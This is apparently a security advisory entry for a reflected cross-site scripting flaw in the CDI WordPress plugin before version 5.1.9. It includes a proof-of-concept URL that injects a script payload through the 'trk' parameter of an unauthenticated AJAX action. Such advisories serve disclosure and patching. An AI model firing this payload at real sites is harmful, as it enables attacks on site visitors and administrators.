## WordPress Plugin Vulnerabilities

# CDI < 5.1.9 - Reflected Cross-Site-Scripting

### Description

The plugin does not sanitise and escape a parameter before outputting it back in the response of an AJAX action (available to both unauthenticated and authenticated users), leading to a Reflected Cross-Site Scripting

### Proof of Concept

https://example.com/wp-admin/admin-ajax.php?action=cdi\_collect\_follow&trk=%3Cscript%3Ealert(`xss`)%3C/script%3E
Note: PHP must be configured with --enable-soap as the plugin appears to import 'SoapClient', which when not found produces an error while installing the plugin.

### Affects Plugins
